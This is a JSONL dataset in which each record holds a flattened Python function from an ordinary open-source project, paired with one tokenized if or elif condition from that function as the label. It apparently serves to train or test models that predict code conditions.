{"input": "def getBody(self, path): if path == \"\": return \"This server has \" + str(self.__fileProvider.count()) + \" files.\" else: downloadCounts = self.__fileProvider.get(path).downloadCount if path in downloadCounts: return str(downloadCounts[path]) else: return \"0\"", "label": "if path in downloadCounts :"}
{"input": "def parse_entrypoints(self, content: str, root=None) -> RootDependency: if root is None: root = RootDependency() entrypoints = [] group = \"console_scripts\" for line in content.split(\"\\n\"): line = line.strip() if not line or line[0] in \"#;\": # ignore comments continue if line[0] == \"[\" and line[-1] == \"]\": group = line[1:-1] else: entrypoints.append(EntryPoint.parse(text=line, group=group)) root.entrypoints = tuple(entrypoints) return root", "label": "if line [ 0 ] == \"[\" and line [ - 1 ] == \"]\" :"}
{"input": "def _validate_callbacks(cls, callbacks): for callback in callbacks: if not isinstance(callback, Callback): if issubclass(callback, Callback): raise TypeError(\"Make sure to instantiate the callbacks.\") raise TypeError(\"Only accepts a `callbacks` instance.\")", "label": "if not isinstance ( callback , Callback ) :"}
{"input": "def detab(self, text): \"\"\"Remove a tab from the front of each line of the given text.\"\"\" newtext = [] lines = text.split(\"\\n\") for line in lines: if line.startswith(\" \" * markdown.TAB_LENGTH): newtext.append(line[markdown.TAB_LENGTH :]) elif not line.strip(): newtext.append(\"\") else: break return \"\\n\".join(newtext), \"\\n\".join(lines[len(newtext) :])", "label": "if line . startswith ( \" \" * markdown . TAB_LENGTH ) :"}
{"input": "def triger_check_network(self, fail=False, force=False): time_now = time.time() if not force: if self._checking_num > 0: return if fail or self.network_stat != \"OK\": # Fail or unknown if time_now - self.last_check_time < 3: return else: if time_now - self.last_check_time < 10: return self.last_check_time = time_now threading.Thread(target=self._simple_check_worker).start()", "label": "if fail or self . network_stat != \"OK\" :"}
{"input": "def wrapper(*args, **kwargs): if is_profiling_enabled(section): global _profile_nesting profile = get_global_profile() _profile_nesting += 1 if _profile_nesting == 1: profile.enable() result = func(*args, **kwargs) _profile_nesting -= 1 if _profile_nesting == 0: profile.disable() return result else: return func(*args, **kwargs)", "label": "if _profile_nesting == 1 :"}
{"input": "def get_sequence_type_str(x: Sequence[Any]) -> str: container_type = type(x).__name__ if not x: if container_type == \"list\": return \"[]\" else: return container_type + \"([])\" elem_type = get_type_str(x[0]) if container_type == \"list\": if len(x) == 1: return \"[\" + elem_type + \"]\" else: return \"[\" + elem_type + \", ...]\" else: if len(x) == 1: return f\"{container_type}([{elem_type}])\" else: return f\"{container_type}([{elem_type}, ...])\"", "label": "if container_type == \"list\" :"}
{"input": "def attempts(self): # We can cache as we deal with history server if not hasattr(self, \"_attempts\"): task_attempts = self.job.api.task_attempts(self.job.id, self.id)[\"taskAttempts\"] if task_attempts: self._attempts = [ Attempt(self, attempt) for attempt in task_attempts[\"taskAttempt\"] ] else: self._attempts = [] return self._attempts", "label": "if task_attempts :"}
{"input": "def __call__(self, message, keyname): if keyname in self.keyring: key = self.keyring[keyname] if isinstance(key, Key) and key.algorithm == GSS_TSIG: if message: GSSTSigAdapter.parse_tkey_and_step(key, message, keyname) return key else: return None", "label": "if message :"}
{"input": "def location_dec(str): head = int(str[0]) str = str[1:] rows = head cols = int(len(str) / rows) + 1 out = \"\" full_row = len(str) % head for c in range(cols): for r in range(rows): if c == (cols - 1) and r >= full_row: continue if r < full_row: char = str[r * cols + c] else: char = str[cols * full_row + (r - full_row) * (cols - 1) + c] out += char return parse.unquote(out).replace(\"^\", \"0\")", "label": "if c == ( cols - 1 ) and r >= full_row :"}
{"input": "def request(self): if \"Cookie\" in self._req._headers: c = self._req._headers[\"Cookie\"].split(\"; \") if c[0]: return cookies.cookie({x[0]: x[2] for x in [x.partition(\"=\") for x in c]}) return cookies.cookie({})", "label": "if c [ 0 ] :"}
{"input": "def bulk_enable_accounts(account_names): \"\"\"Bulk enable accounts\"\"\" for account_name in account_names: account = Account.query.filter(Account.name == account_name).first() if account: app.logger.debug(\"Enabling account %s\", account.name) account.active = True db.session.add(account) db.session.commit() db.session.close()", "label": "if account :"}
{"input": "def acquire(self, blocking=True, timeout=None): if not blocking and timeout is not None: raise ValueError(\"can't specify timeout for non-blocking acquire\") rc = False endtime = None self._cond.acquire() while self._value == 0: if not blocking: break if timeout is not None: if endtime is None: endtime = _time() + timeout else: timeout = endtime - _time() if timeout <= 0: break self._cond.wait(timeout) else: self._value = self._value - 1 rc = True self._cond.release() return rc", "label": "if endtime is None :"}
{"input": "def _sorted_layers(self, structure, top_layer_id): \"\"\"Return the image layers sorted\"\"\" sorted_layers = [] next_layer = top_layer_id while next_layer: sorted_layers.append(next_layer) if \"json\" not in structure[\"repolayers\"][next_layer]: # v2 break if \"parent\" not in structure[\"repolayers\"][next_layer][\"json\"]: break next_layer = structure[\"repolayers\"][next_layer][\"json\"][\"parent\"] if not next_layer: break return sorted_layers", "label": "if \"parent\" not in structure [ \"repolayers\" ] [ next_layer ] [ \"json\" ] :"}
{"input": "def on_change(self, data): # loop over tp_clipboard views for window in sublime.windows(): for view in window.views(): if view.get_status(\"inactive\") and view.settings().get(\"tp_append\", False): file_name = view.file_name() # ammo if view.settings().get(\"tp_ammo\", False): self.update(view) elif file_name and file_name.endswith( global_settings(\"ammo_file_extension\", \".ammo\") ): self.update(view)", "label": "if view . get_status ( \"inactive\" ) and view . settings ( ) . get ( \"tp_append\" , False ) :"}
{"input": "def _maintain_pool(self): waiting = self._docker_interface.services_waiting_by_constraints() active = self._docker_interface.nodes_active_by_constraints() for constraints, needed_dict in self._state.slots_needed(waiting, active).items(): services = needed_dict[\"services\"] nodes = needed_dict[\"nodes\"] slots_needed = needed_dict[\"slots_needed\"] if slots_needed > 0: self._spawn_nodes(constraints, services, slots_needed) elif slots_needed < 0: self._destroy_nodes(constraints, nodes, slots_needed)", "label": "elif slots_needed < 0 :"}
{"input": "def _update_vhosts_addrs_ssl(self, vhosts): \"\"\"Update a list of raw parsed vhosts to include global address sslishness\"\"\" addr_to_ssl = self._build_addr_to_ssl() for vhost in vhosts: for addr in vhost.addrs: addr.ssl = addr_to_ssl[addr.normalized_tuple()] if addr.ssl: vhost.ssl = True", "label": "if addr . ssl :"}
{"input": "def gather_files(fileset): common_type = get_common_filetype(fileset) files = [] for file in fileset.file: filename = file.name if file.is_include_file == True: filename = {} filename[file.name] = {\"is_include_file\": True} if file.file_type != common_type: if type(filename) == str: filename = {} filename[file.name] = {\"file_type\": file.file_type} files.append(filename) return files", "label": "if file . is_include_file == True :"}
{"input": "def _get_resource_group_name_of_staticsite(client, static_site_name): static_sites = client.list() for static_site in static_sites: if static_site.name.lower() == static_site_name.lower(): resource_group = _parse_resource_group_from_arm_id(static_site.id) if resource_group: return resource_group raise CLIError( \"Static site was '{}' not found in subscription.\".format(static_site_name) )", "label": "if static_site . name . lower ( ) == static_site_name . lower ( ) :"}
{"input": "def triger_check_network(self, fail=False, force=False): time_now = time.time() if not force: if self._checking_num > 0: return if fail or self.network_stat != \"OK\": # Fail or unknown if time_now - self.last_check_time < 3: return else: if time_now - self.last_check_time < 10: return self.last_check_time = time_now threading.Thread(target=self._simple_check_worker).start()", "label": "if self . _checking_num > 0 :"}
{"input": "def _gen(): for i in dataset(): if isinstance(i, tuple) or isinstance(i, list): if fn(*i) is True: yield i else: if fn(i) is True: yield i", "label": "if fn ( * i ) is True :"}
{"input": "def _merge_dict(d1, d2): # Modifies d1 in-place to take values from d2 # if the nested keys from d2 are present in d1. # https://stackoverflow.com/a/10704003/4488789 for k, v2 in d2.items(): v1 = d1.get(k) # returns None if v1 has no such key if v1 is None: raise Exception(\"{} is not recognized by client_config\".format(k)) if isinstance(v1, Mapping) and isinstance(v2, Mapping): _merge_dict(v1, v2) else: d1[k] = v2 return d1", "label": "if isinstance ( v1 , Mapping ) and isinstance ( v2 , Mapping ) :"}
{"input": "def OnRelease(self, evt): if self.isDrag: parent = self.GetParent() DrawSash(parent, self.px, self.py, self.side) self.ReleaseMouse() self.isDrag = False if self.side == MV_HOR: parent.AddLeaf(MV_VER, self.py) else: parent.AddLeaf(MV_HOR, self.px) else: evt.Skip()", "label": "if self . side == MV_HOR :"}
{"input": "def check_zookeeper_metrics(): response = get_metrics_prom(dcos_api_session, dcos_api_session.masters[0]) for family in text_string_to_metric_families(response.text): for sample in family.samples: if sample[0] == \"zookeeper_avg_latency\": assert sample[1][\"dcos_component_name\"] == \"ZooKeeper\" return raise Exception(\"Expected ZooKeeper zookeeper_avg_latency metric not found\")", "label": "if sample [ 0 ] == \"zookeeper_avg_latency\" :"}
{"input": "def scan_patterns(self, kind): \"\"\"Parse the config section into a list of patterns, preserving order.\"\"\" d = self.scan_d(kind) aList = [] seen = set() for key in d: value = d.get(key) if key in seen: g.trace(\"duplicate key\", key) else: seen.add(key) aList.append(self.msf.Pattern(key, value)) return aList", "label": "if key in seen :"}
{"input": "def foundNestedPseudoClass(self): i = self.pos + 1 openParen = 0 while i < len(self.source_text): ch = self.source_text[i] if ch == \"{\": return True elif ch == \"(\": # pseudoclasses can contain () openParen += 1 elif ch == \")\": if openParen == 0: return False openParen -= 1 elif ch == \";\" or ch == \"}\": return False i += 1 return False", "label": "if openParen == 0 :"}
{"input": "def append(self, child): if child not in (None, self): tag = child_tag(self._tag) if tag: if isinstance(child, Html): if child.tag != tag: child = Html(tag, child) elif not child.startswith(\"<%s\" % tag): child = Html(tag, child) super().append(child)", "label": "if isinstance ( child , Html ) :"}
{"input": "def forward(self, x, activate=True, norm=True): for layer in self.order: if layer == \"conv\": if self.with_explicit_padding: x = self.padding_layer(x) x = self.conv(x) elif layer == \"norm\" and norm and self.with_norm: x = self.norm(x) elif layer == \"act\" and activate and self.with_activation: x = self.activate(x) return x", "label": "if self . with_explicit_padding :"}
{"input": "def get_tasks(self): for task in asyncio.all_tasks(loop=self.middleware.loop): formatted = None frame = None frames = [] for frame in task.get_stack(): cur_frame = get_frame_details(frame, self.logger) if cur_frame: frames.append(cur_frame) if frame: formatted = traceback.format_stack(frame) yield { \"stack\": formatted, \"frames\": frames, }", "label": "if cur_frame :"}
{"input": "def _read_row_from_packet(self, packet): row = [] for encoding, converter in self.converters: try: data = packet.read_length_coded_string() except IndexError: # No more columns in this row # See https://github.com/PyMySQL/PyMySQL/pull/434 break if data is not None: if encoding is not None: data = data.decode(encoding) if DEBUG: print(\"DEBUG: DATA = \", data) if converter is not None: data = converter(data) row.append(data) return tuple(row)", "label": "if DEBUG :"}
{"input": "def get_child(self, name): if self.isdir: try: return self.data[name] except: if not self.case_sensitive: for childname, child in list(self.data.items()): if childname.lower() == name.lower(): return child raise", "label": "if childname . lower ( ) == name . lower ( ) :"}
{"input": "def _line_generator(fh, skip_blanks=False, strip=True): for line in fh: if strip: line = line.strip() skip = False if skip_blanks: skip = line.isspace() or not line if not skip: yield line", "label": "if skip_blanks :"}
{"input": "def atleast_3d(*arys): if len(arys) == 1: arr = array(arys[0]) if ndim(arr) == 0: arr = expand_dims(arr, axis=(0, 1, 2)) elif ndim(arr) == 1: arr = expand_dims(arr, axis=(0, 2)) elif ndim(arr) == 2: arr = expand_dims(arr, axis=2) return arr else: return [atleast_3d(arr) for arr in arys]", "label": "elif ndim ( arr ) == 1 :"}
{"input": "def scan_resource_conf(self, conf): os_profile = conf.get(\"os_profile\") if os_profile: os_profile = os_profile[0] custom_data = os_profile.get(\"custom_data\") if custom_data: custom_data = custom_data[0] if isinstance(custom_data, str): if string_has_secrets(custom_data): return CheckResult.FAILED return CheckResult.PASSED", "label": "if string_has_secrets ( custom_data ) :"}
{"input": "def __call__(self, trainer): observation = trainer.observation if self.key in observation: loss = observation[self.key] if self.best_model == -1 or loss < self.min_loss: self.min_loss = loss self.best_model = trainer.updater.epoch src = \"%s.%d\" % (self.prefix, self.best_model) dest = os.path.join(trainer.out, \"%s.%s\" % (self.prefix, self.suffix)) if os.path.lexists(dest): os.remove(dest) os.symlink(src, dest) logging.info(\"best model is \" + src)", "label": "if self . best_model == - 1 or loss < self . min_loss :"}
{"input": "def dump_prefs(self): ret = \"\" for pref in self.prefs: if type(self.prefs[pref].value) == int: value = str(self.prefs[pref].value) elif type(self.prefs[pref].value) == bool: value = \"true\" if self.prefs[pref].value == True else \"false\" else: value = '\"%s\"' % self.prefs[pref].value ret += pref + \": \" + value + \" (\" + self.prefs[pref].anon_source + \")\\n\" return ret", "label": "if type ( self . prefs [ pref ] . value ) == int :"}
{"input": "def translate_isinstance( builder: IRBuilder, expr: CallExpr, callee: RefExpr ) -> Optional[Value]: # Special case builtins.isinstance if ( len(expr.args) == 2 and expr.arg_kinds == [ARG_POS, ARG_POS] and isinstance(expr.args[1], (RefExpr, TupleExpr)) ): irs = builder.flatten_classes(expr.args[1]) if irs is not None: return builder.builder.isinstance_helper( builder.accept(expr.args[0]), irs, expr.line ) return None", "label": "if irs is not None :"}
{"input": "def autoname(self): naming_method = frappe.db.get_value(\"HR Settings\", None, \"emp_created_by\") if not naming_method: throw(_(\"Please setup Employee Naming System in Human Resource > HR Settings\")) else: if naming_method == \"Naming Series\": set_name_by_naming_series(self) elif naming_method == \"Employee Number\": self.name = self.employee_number elif naming_method == \"Full Name\": self.set_employee_name() self.name = self.employee_name self.employee = self.name", "label": "if naming_method == \"Naming Series\" :"}
{"input": "def search_expr(sheet, expr, reverse=False): for i in rotateRange(len(sheet.rows), sheet.cursorRowIndex, reverse=reverse): try: if sheet.evalExpr(expr, sheet.rows[i]): sheet.cursorRowIndex = i return except Exception as e: vd.exceptionCaught(e) vd.fail(f\"no {sheet.rowtype} where {expr}\")", "label": "if sheet . evalExpr ( expr , sheet . rows [ i ] ) :"}
{"input": "def _targets(self, urls, querystring): for input, output in urls: response = self.client.get(u\"/1/%s\" % input, follow=True) if output == 404: eq_(404, response.status_code) elif output.startswith(\"http\"): chain = [u[0] for u in response.redirect_chain] assert output in chain else: r = response.redirect_chain r.reverse() final = urlparse(r[0][0]) eq_(output, final.path) eq_(querystring, final.query)", "label": "elif output . startswith ( \"http\" ) :"}
{"input": "def get_local_cache(self, past, data, from_file, temp_id): \"\"\"parse individual cached geometry if there is any\"\"\" cache = [] if self.accumulative: if from_file and len(past) > 0: cache = past[temp_id] if not from_file and len(data) > 0: cache = data.get(temp_id, []) return cache", "label": "if not from_file and len ( data ) > 0 :"}
{"input": "def _parse_abbrev_table(self): \"\"\"Parse the abbrev table from the stream\"\"\" map = {} self.stream.seek(self.offset) while True: decl_code = struct_parse( struct=self.structs.Dwarf_uleb128(\"\"), stream=self.stream ) if decl_code == 0: break declaration = struct_parse( struct=self.structs.Dwarf_abbrev_declaration, stream=self.stream ) map[decl_code] = AbbrevDecl(decl_code, declaration) return map", "label": "if decl_code == 0 :"}
{"input": "def mFRIDAY( self, ): try: _type = FRIDAY _channel = DEFAULT_CHANNEL pass self.match(\"fri\") alt10 = 2 LA10_0 = self.input.LA(1) if LA10_0 == 100: alt10 = 1 if alt10 == 1: pass self.match(\"day\") self._state.type = _type self._state.channel = _channel finally: pass", "label": "if alt10 == 1 :"}
{"input": "def __getattr__(self, key): from mongokit.schema_document import i18n if key in self: if isinstance(self[key], i18n): if self._doc._current_lang not in self[key]: return self[key].get(self._doc._fallback_lang) return self[key][self._doc._current_lang] return self[key]", "label": "if self . _doc . _current_lang not in self [ key ] :"}
{"input": "def compact_repr(record): parts = [] for key in record.__attributes__: value = getattr(record, key) if not value: continue if isinstance(value, list): value = HIDE_LIST elif key == FEATS: value = format_feats(value) else: value = repr(value) value = capped_str(value) parts.append(\"%s=%s\" % (key, value)) return \"%s(%s)\" % (record.__class__.__name__, \", \".join(parts))", "label": "if isinstance ( value , list ) :"}
{"input": "def pre_validate(self, form): if self.data: values = list(c[0] for c in self.choices) for d in self.data: if d not in values: raise ValueError( self.gettext(u\"'%(value)s' is not a valid choice for this field\") % dict(value=d) )", "label": "if d not in values :"}
{"input": "def _sql_like_to_regex(pattern, escape): cur_i = 0 pattern_length = len(pattern) while cur_i < pattern_length: nxt_i = cur_i + 1 cur = pattern[cur_i] nxt = pattern[nxt_i] if nxt_i < pattern_length else None skip = 1 if nxt is not None and escape is not None and cur == escape: yield nxt skip = 2 elif cur == \"%\": yield \".*\" elif cur == \"_\": yield \".\" else: yield cur cur_i += skip", "label": "elif cur == \"%\" :"}
{"input": "def find_caller(stack): \"\"\"Finds info about first non-sqlalchemy call in stack\"\"\" for frame in stack: # We don't care about sqlalchemy internals module = inspect.getmodule(frame[0]) if not hasattr(module, \"__name__\"): continue if module.__name__.startswith(\"sqlalchemy\"): continue return (module.__name__,) + tuple(frame[2:4]) + (frame[4][0].strip(),) log.warning(\"Transaction from unknown origin\") return None, None, None, None", "label": "if not hasattr ( module , \"__name__\" ) :"}
{"input": "def _get_normal_median_depth(normal_counts): depths = [] with open(normal_counts) as in_handle: header = None for line in in_handle: if header is None and not line.startswith(\"@\"): header = line.strip().split() elif header: n_vals = dict(zip(header, line.strip().split())) depths.append(int(n_vals[\"REF_COUNT\"]) + int(n_vals[\"ALT_COUNT\"])) return np.median(depths)", "label": "elif header :"}
{"input": "def get_pool(self, *args, **kw): key = self._serialize(*args, **kw) try: return self.pools[key] except KeyError: self._create_pool_mutex.acquire() try: if key not in self.pools: kw.pop(\"sa_pool_key\", None) pool = self.poolclass( lambda: self.module.connect(*args, **kw), **self.kw ) self.pools[key] = pool return pool else: return self.pools[key] finally: self._create_pool_mutex.release()", "label": "if key not in self . pools :"}
{"input": "def add(self, field, value, boost=None): match = {\"value\": value} if boost: if isinstance(boost, (float, int)): match[\"boost\"] = boost else: match[\"boost\"] = float(boost) self._values[field] = match return self._values[field] = value", "label": "if isinstance ( boost , ( float , int ) ) :"}
{"input": "def get_shape(shape): \"\"\"Convert the shape to correct dtype and vars.\"\"\" ret = [] for dim in shape: if isinstance(dim, tvm.tir.IntImm): if libinfo()[\"INDEX_DEFAULT_I64\"] == \"ON\": ret.append(dim) else: val = int(dim) assert val <= np.iinfo(np.int32).max ret.append(tvm.tir.IntImm(\"int32\", val)) elif isinstance(dim, tvm.tir.Any): ret.append(te.var(\"any_dim\", \"int32\")) else: ret.append(dim) return ret", "label": "if libinfo ( ) [ \"INDEX_DEFAULT_I64\" ] == \"ON\" :"}
{"input": "def _find_icacls_exe(): if os.name == \"nt\": paths = [ os.path.expandvars(r\"%windir%\\{0}\").format(subdir) for subdir in (\"system32\", \"SysWOW64\") ] for path in paths: icacls_path = next( iter(fn for fn in os.listdir(path) if fn.lower() == \"icacls.exe\"), None ) if icacls_path is not None: icacls_path = os.path.join(path, icacls_path) return icacls_path return None", "label": "if icacls_path is not None :"}
{"input": "def mlt_version_is_greater_correct(test_version): runtime_ver = mlt_version.split(\".\") test_ver = test_version.split(\".\") if runtime_ver[0] > test_ver[0]: return True elif runtime_ver[0] == test_ver[0]: if runtime_ver[1] > test_ver[1]: return True elif runtime_ver[1] == test_ver[1]: if runtime_ver[2] > test_ver[2]: return True return False", "label": "if runtime_ver [ 2 ] > test_ver [ 2 ] :"}
{"input": "def get_ready_conn(self, host): conn = None self._lock.acquire() try: if host in self._hostmap: for c in self._hostmap[host]: if self._readymap[c]: self._readymap[c] = 0 conn = c break finally: self._lock.release() return conn", "label": "if self . _readymap [ c ] :"}
{"input": "def to_svc_hst_distinct_lists(ref, tab): r = {\"hosts\": [], \"services\": []} for e in tab: cls = e.__class__ if cls.my_type == \"service\": name = e.get_dbg_name() r[\"services\"].append(name) else: name = e.get_dbg_name() r[\"hosts\"].append(name) return r", "label": "if cls . my_type == \"service\" :"}
{"input": "def playerData(s): \"\"\"Returns a list of tuples of original string and dict of values\"\"\" p = [] i = 0 while True: match = re_input.match(s, pos=i) if match is None: return p else: d = match.groupdict() if d[\"args\"] is not None: d[\"degree\"], d[\"kwargs\"] = getArgs(d[\"args\"]) else: d[\"degree\"], d[\"kwargs\"] = \"\", {} del d[\"args\"] p.append((match.group().strip(), d)) i = match.end() return", "label": "if d [ \"args\" ] is not None :"}
{"input": "def _params_for_TXT(self, record): for value in record.values: field_type = \"TXT\" if self._is_valid_dkim(value): field_type = \"DKIM\" value = value.replace(\"\\\\;\", \";\") yield { \"target\": value, \"subDomain\": record.name, \"ttl\": record.ttl, \"fieldType\": field_type, }", "label": "if self . _is_valid_dkim ( value ) :"}
{"input": "def create(self, values): conn = self.get_connection() object_classes = self.structural_classes + [self.object_class] attrs = [(\"objectClass\", object_classes)] for k, v in values.iteritems(): if k == \"id\" or k in self.attribute_ignore: continue if v is not None: attr_type = self.attribute_mapping.get(k, k) attrs.append((attr_type, [v])) if \"groupOfNames\" in object_classes and self.use_dumb_member: attrs.append((\"member\", [self.DUMB_MEMBER_DN])) conn.add_s(self._id_to_dn(values[\"id\"]), attrs) return values", "label": "if v is not None :"}
{"input": "def get_new_unlinked_nodes( before_inputted_nodes, before_input_sockets, input_sockets, nodes_dict ): affected_nodes = [] for node_id, socket in zip(before_inputted_nodes, before_input_sockets): if not socket in input_sockets: # if the node has been deleted it is not affected if node_id in nodes_dict: if not node_id in affected_nodes: affected_nodes.append(node_id) return affected_nodes", "label": "if not node_id in affected_nodes :"}
{"input": "def show_panel(panel_id): # Iterate positions to find where panel is and bring it to front. for position in _positions_names: pos_panel_ids = _get_position_panels(position) if len(pos_panel_ids) == 0: continue if len(pos_panel_ids) == 1: continue panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id] notebook = _position_notebooks[position] for i in range(0, notebook.get_n_pages()): notebook_page = notebook.get_nth_page(i) if notebook_page == panel_widget: notebook.set_current_page(i)", "label": "if notebook_page == panel_widget :"}
{"input": "def merge(self, abort=False, message=None): \"\"\"Merge remote branch or reverts the merge.\"\"\" if abort: self.execute([\"update\", \"--clean\", \".\"]) elif self.needs_merge(): if self.needs_ff(): self.execute([\"update\", \"--clean\", \"remote(.)\"]) else: self.configure_merge() # Fallback to merge try: self.execute([\"merge\", \"-r\", \"remote(.)\"]) except RepositoryException as error: if error.retcode == 255: # Nothing to merge return raise self.execute([\"commit\", \"--message\", \"Merge\"])", "label": "if self . needs_ff ( ) :"}
{"input": "def runButtons(action): global sqlUpdate if action == \"Clear\": app.text(LABS[\"run\"], replace=True) app.message(LABS[\"run\"], \"\", bg=\"grey\") log(\"SQL cleared\") elif action == \"Run\": app.message(LABS[\"run\"], \"\") sql = app.text(LABS[\"run\"]).strip() if len(sql) > 0: runSql(sql) else: app.message(LABS[\"run\"], \"\", bg=\"grey\") app.text(LABS[\"run\"], focus=True)", "label": "if len ( sql ) > 0 :"}
{"input": "def receive_loop(self): while not self._stoped: try: rd, _, _ = select.select([self.teredo_sock], [], [], 0.5) if rd and not self._stoped: self.receive_ra_packet() except Exception as e: logger.exception(\"receive procedure fail once: %r\", e) pass", "label": "if rd and not self . _stoped :"}
{"input": "def add_items(self, model, objs): search_fields = model.get_search_fields() if not search_fields: return indexers = [ObjectIndexer(obj, self.backend) for obj in objs] # TODO: Delete unindexed objects while dealing with proxy models. if indexers: content_type_pk = get_content_type_pk(model) update_method = ( self.add_items_upsert if self._enable_upsert else self.add_items_update_then_create ) update_method(content_type_pk, indexers)", "label": "if self . _enable_upsert"}
{"input": "def __init__(self, service: RestClient, **k_args: Dict[str, str]): self.path: str = None self.httpMethod: str = None self.service: RestClient = service self.__dict__.update(k_args) self.path_args: List[str] = [] self.query_args: List[str] = [] if hasattr(self, \"parameters\"): for key, value in self.parameters.items(): if value[\"location\"] == \"path\": self.path_args.append(key) else: self.query_args.append(key)", "label": "if value [ \"location\" ] == \"path\" :"}
{"input": "def insertion_unsort(str, extended): \"\"\"3.2 Insertion unsort coding\"\"\" oldchar = 0x80 result = [] oldindex = -1 for c in extended: index = pos = -1 char = ord(c) curlen = selective_len(str, char) delta = (curlen + 1) * (char - oldchar) while 1: index, pos = selective_find(str, c, index, pos) if index == -1: break delta += index - oldindex result.append(delta - 1) oldindex = index delta = 0 oldchar = char return result", "label": "if index == - 1 :"}
{"input": "def get_sorted_entry(field, bookid): if field == \"title\" or field == \"authors\": book = calibre_db.get_filtered_book(bookid) if book: if field == \"title\": return json.dumps({\"sort\": book.sort}) elif field == \"authors\": return json.dumps({\"author_sort\": book.author_sort}) return \"\"", "label": "if field == \"title\" :"}
{"input": "def _convert_tstamp(out): # Searches for top-level timestamp attributes or within dictionaries if \"timestamp\" in out: # Convert UNIX to datetime object f = float(out[\"timestamp\"]) out[\"timestamp\"] = datetime.fromtimestamp(f / 1000) else: for ticker, data in out.items(): if \"timestamp\" in data: f = float(data[\"timestamp\"]) data[\"timestamp\"] = datetime.fromtimestamp(f / 1000) out[ticker] = data return out", "label": "if \"timestamp\" in data :"}
{"input": "def write_urls(self, person): \"\"\"Write URL and EMAIL properties of a VCard.\"\"\" url_list = person.get_url_list() for url in url_list: href = url.get_path() if href: if url.get_type() == UrlType(UrlType.EMAIL): if href.startswith(\"mailto:\"): href = href[len(\"mailto:\") :] self.writeln(\"EMAIL:%s\" % self.esc(href)) else: self.writeln(\"URL:%s\" % self.esc(href))", "label": "if href :"}
{"input": "def get_range(min, max): if max < min: min, max = max, min elif min == max: if min < 0: min, max = 2 * min, 0 elif min > 0: min, max = 0, 2 * min else: min, max = -1, 1 return min, max", "label": "if min < 0 :"}
{"input": "def __init__(self, mapping=None): if isinstance(mapping, MultiDict): dict.__init__(self, ((k, l[:]) for k, l in mapping.iterlists())) elif isinstance(mapping, dict): tmp = {} for key, value in mapping.iteritems(): if isinstance(value, (tuple, list)): value = list(value) else: value = [value] tmp[key] = value dict.__init__(self, tmp) else: tmp = {} for key, value in mapping or (): tmp.setdefault(key, []).append(value) dict.__init__(self, tmp)", "label": "if isinstance ( value , ( tuple , list ) ) :"}
{"input": "def modified_precision(candidate, references, n): candidate_ngrams = list(ngrams(candidate, n)) if len(candidate_ngrams) == 0: return 0 c_words = set(candidate_ngrams) for word in c_words: count_w = candidate_ngrams.count(word) + 1 count_max = 0 for reference in references: reference_ngrams = list(ngrams(reference, n)) count = reference_ngrams.count(word) + 1 if count > count_max: count_max = count return min(count_w, count_max) / (len(candidate) + len(c_words))", "label": "if count > count_max :"}
{"input": "def reverse_adjust_line_according_to_hunks(self, hunks, line): for hunk in reversed(hunks): head_start = hunk.head_start saved_start = hunk.saved_start if hunk.saved_length == 0: saved_start += 1 elif hunk.head_length == 0: saved_start -= 1 head_end = head_start + hunk.head_length saved_end = saved_start + hunk.saved_length if saved_end <= line: return head_end + line - saved_end elif saved_start <= line: return head_start # fails to find matching return line", "label": "elif saved_start <= line :"}
{"input": "def indent_xml(elem, level=0): \"\"\"Do our pretty printing and make Matt very happy.\"\"\" i = \"\\n\" + level * \" \" if elem: if not elem.text or not elem.text.strip(): elem.text = i + \" \" if not elem.tail or not elem.tail.strip(): elem.tail = i for elem in elem: indent_xml(elem, level + 1) if not elem.tail or not elem.tail.strip(): elem.tail = i else: if level and (not elem.tail or not elem.tail.strip()): elem.tail = i", "label": "if not elem . tail or not elem . tail . strip ( ) :"}
{"input": "def test_infer_shape_matrix(self): # Testing the infer_shape with a matrix. x = theano.tensor.matrix() for op in self.ops: if not op.return_inverse: continue if op.return_index: f = op(x)[2] else: f = op(x)[1] self._compile_and_check( [x], [f], [np.asarray(np.array([[2, 1], [3, 2], [2, 3]]), dtype=config.floatX)], self.op_class, )", "label": "if not op . return_inverse :"}
{"input": "def drop_lists(value): out = {} for key, val in value.items(): val = val[0] if isinstance(key, bytes): key = str(key, \"utf-8\") if isinstance(val, bytes): val = str(val, \"utf-8\") out[key] = val return out", "label": "if isinstance ( val , bytes ) :"}
{"input": "def malloc(self, size): # return a block of right size (possibly rounded up) assert 0 <= size < sys.maxsize if os.getpid() != self._lastpid: self.__init__() # reinitialize after fork with self._lock: self._free_pending_blocks() size = self._roundup(max(size, 1), self._alignment) (arena, start, stop) = self._malloc(size) new_stop = start + size if new_stop < stop: self._free((arena, new_stop, stop)) block = (arena, start, new_stop) self._allocated_blocks.add(block) return block", "label": "if new_stop < stop :"}
{"input": "def ContinueStatement(self, label, **kwargs): if label is None: self.emit(\"JUMP\", self.implicit_continues[-1]) else: label = label.get(\"name\") if label not in self.declared_continue_labels: raise MakeError(\"SyntaxError\", \"Undefined label '%s'\" % label) else: self.emit(\"JUMP\", self.declared_continue_labels[label])", "label": "if label not in self . declared_continue_labels :"}
{"input": "def parse_counter_style_name(tokens, counter_style): tokens = remove_whitespace(tokens) if len(tokens) == 1: (token,) = tokens if token.type == \"ident\": if token.lower_value in (\"decimal\", \"disc\"): if token.lower_value not in counter_style: return token.value elif token.lower_value != \"none\": return token.value", "label": "if token . type == \"ident\" :"}
{"input": "def __call__(self, data): num_points = data.pos.shape[0] new_data = Data() for key in data.keys: if key == KDTREE_KEY: continue item = data[key] if torch.is_tensor(item) and num_points == item.shape[0]: item = item[self._indices].clone() elif torch.is_tensor(item): item = item.clone() setattr(new_data, key, item) return new_data", "label": "if torch . is_tensor ( item ) and num_points == item . shape [ 0 ] :"}
{"input": "def HandleEvent(self, event): e_id = event.GetId() if e_id in self.handlers: handler = self.handlers[e_id] try: if handler: return handler(event) except RuntimeError: self.RemoveHandlerForID(e_id) else: event.Skip() return False", "label": "if handler :"}
{"input": "def try_append_extension(self, path): append_setting = self.get_append_extension_setting() if self.settings.get(append_setting, False): if not self.is_copy_original_name(path): _, new_path_extension = os.path.splitext(path) if new_path_extension == \"\": argument_name = self.get_argument_name() if argument_name is None: _, extension = os.path.splitext(self.view.file_name()) else: _, extension = os.path.splitext(argument_name) path += extension return path", "label": "if new_path_extension == \"\" :"}
